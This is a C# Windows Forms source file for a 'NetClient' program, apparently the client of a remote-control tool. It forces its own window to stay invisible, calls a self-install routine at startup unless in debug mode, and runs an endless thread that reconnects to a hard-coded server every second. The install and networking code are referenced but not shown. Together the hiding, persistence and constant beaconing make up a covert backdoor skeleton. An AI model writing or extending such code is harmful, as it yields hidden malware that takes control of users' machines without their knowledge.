using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace NetClient {
	public partial class Client : Form {

		private NetServer.TcpServer.Client client = null;
		private static readonly string _serverIp = "127.0.0.1";

		private bool _Debug = false;


		public Client() {
			InitializeComponent();
		}

		protected override void OnVisibleChanged(EventArgs e) {
			base.OnVisibleChanged(e);
			this.Visible = false;
		}



		private void KeepConnectServer() {

			client = new NetServer.TcpServer.Client();

			string serverIp = string.Empty;
			while (serverIp == string.Empty) {
				serverIp = _serverIp;
			}

			client.ServerIp = serverIp;


			Thread keepThread = new Thread(new ThreadStart(delegate() {
				while (true) {
					if (!client.IsConnected)
						client.ConnectToServer();
					Thread.Sleep(1000);
					Application.DoEvents();
				}
			}));

			keepThread.Start();



		}

		private void Client_Load(object sender, EventArgs e) {
			if (!_Debug) {
				InstallSelf.Install();
			}
			KeepConnectServer();

		}





	}
}
